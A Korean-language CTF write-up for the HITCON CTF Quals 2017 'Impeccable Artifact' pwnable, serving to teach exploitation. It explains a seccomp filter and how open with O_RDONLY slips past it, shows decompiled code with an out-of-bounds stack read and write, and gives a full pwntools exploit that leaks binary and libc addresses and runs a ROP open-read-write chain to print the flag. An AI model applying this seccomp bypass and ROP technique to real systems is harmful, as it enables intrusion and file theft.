---
layout: post
title: HITCON CTF Quals 2017 - Impeccable Artifact
category: writeup
---

Linux ELF pwnable challenge.

> 完美無瑕 ~Impeccable Artifact~
> Overwhelmingly consummate protection

제목은 우리말로 "완전무결" 정도 되겠다. PIE가 걸린 x64 ELF 바이너리와 libc.so 바이너리를 주었다.

### 1. Sandbox

프로그램이 실행되면 우선 아래와 같은 seccomp 시스템 콜 필터가 걸린다.

<!--more-->

```
0000: A = arch
0001: if (A != ARCH_X86_64) goto 0018
0002: A = args[2]
0003: X = A
0004: A = sys_number
0005: if (A == read) goto 0019
0006: if (A == write) goto 0019
0007: if (A == fstat) goto 0019
0008: if (A == lseek) goto 0019
0009: if (A == mmap) goto 0011
0010: if (A != mprotect) goto 0014
0011: A = X # args[2]
0012: A &= 0x1
0013: if (A == 1) goto 0018 else goto 0019
0014: if (A == X) goto 0019
0015: if (A == brk) goto 0019
0016: if (A == exit) goto 0019
0017: if (A == exit_group) goto 0019
0018: return KILL
0019: return ALLOW
```

read, write, fstat, lseek, brk, exit, exit\_group은 완전히 허용되며, mmap과 mprotect는 권한이 1(PROT\_READ)여야 한다. 나머지 시스템 콜의 경우 시스콜 번호(`sys_number`)와 세 번째(`args[2]`) 인자 값이 같아야 된다.

이 때문에 execve는 실행이 불가능해진다. 세 번째 인자인 envp가 execve의 시스콜 번호인 59가 되면 segmentation fault를 내고 죽을 것이기 때문이다. 하지만 open 시스템 콜의 경우 두 번째 인자인 flags에 0(`O_RDONLY`)를 주면 세 번째 인자가 무시되기 때문에 플래그 파일을 여는 용도로 사용할 수 있다.

### 2. Exploit

대놓고 out-of-bounds access가 되는 코드다. 따라서 스택의 임의의 위치에 데이터를 읽고 쓸 수 있다.

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int cmd; // [rsp+8h] [rbp-658h]@2
  int idx; // [rsp+Ch] [rbp-654h]@2
  __int64 arr[201]; // [rsp+10h] [rbp-650h]@1
  __int64 v7; // [rsp+658h] [rbp-8h]@1

  v7 = *MK_FP(__FS__, 40LL);
  setup_sandbox();
  memset(arr, 0, 1600uLL);
  while ( 1 )
  {
    show_menu();
    idx = 0;
    _isoc99_scanf("%d", &cmd);
    if ( cmd != 1 && cmd != 2 )
      break;
    puts("Idx?");
    _isoc99_scanf("%d", &idx);
    if ( cmd == 1 )
    {
      printf("Here it is: %lld\n", arr[idx]);
    }
    else
    {
      puts("Give me your number:");
      _isoc99_scanf("%lld", &arr[idx]);
    }
  }
  return 0LL;
}
```

디버깅을 해 보면 스택 상에 여러 데이터가 남아있는데, 이로부터 바이너리 주소와 libc 주소 등을 알 수 있다. 그 다음은 ROP로 open-read-write 체인을 짜서 flag파일을 읽으면 된다. open 시스템 콜을 호출할 때 세 번째 인자로 open의 시스템 콜 번호인 2를 넣어줘야 한 다는 점만 주의하면 크게 어려울 것이 없는 문제였다.

```py
from pwn import *
import sys

p = remote('52.192.178.153', 31337)

mask = (1 << 64) - 1
def get(idx):
    p.readuntil('Choice?\n')
    p.send('1\n')
    p.readuntil('Idx?\n')
    p.send(str(idx) + '\n')
    p.readuntil("Here it is: ")
    return int(p.readline()) & mask

def put(idx, val):
    p.readuntil('Choice?\n')
    p.send('2\n')
    p.readuntil('Idx?\n')
    p.send(str(idx) + '\n')
    p.readuntil('Give me your number:\n')
    p.send(str(val & mask) + '\n')

def quit():
    p.readuntil('Choice?\n')
    p.send('3\n')

ofs_lsm_ret = 0x203F1  # Return address of main, which is somewhere in __libc_start_main.
ofs_open64 = 0xf8660
ofs_write = 0xF88E0
ofs_read = 0xF8880

bin_base = get(202) - 0xbb0
libc_base = get(203) - ofs_lsm_ret

poprdi = bin_base + 0xc13
poprsi = libc_base + 0x1fcbd
poprdx = libc_base + 0x1b92
scratchpad = libc_base + 0x3C6A08

chain = [
    poprdi, 0,
    poprsi, scratchpad,
    poprdx, 20,
    libc_base + ofs_read,  # Read file name from stdin.

    poprdi, scratchpad,
    poprsi, 0,
    poprdx, 2,
    libc_base + ofs_open64, # Open the file.

    poprdi, 3,
    poprsi, scratchpad,
    poprdx, 100,
    libc_base + ofs_read,  # Read the file (fd=3).

    poprdi, 1,
    poprsi, scratchpad,
    poprdx, 100,
    libc_base + ofs_write, # Write the content to stdout.
]

for idx, val in enumerate(chain):
    put(203 + idx, val)
quit()

p.send('flag'.ljust(100, '\0'))
p.interactive()
```

`hitcon{why_libseccomp_cheated_me_Q_Q}`.

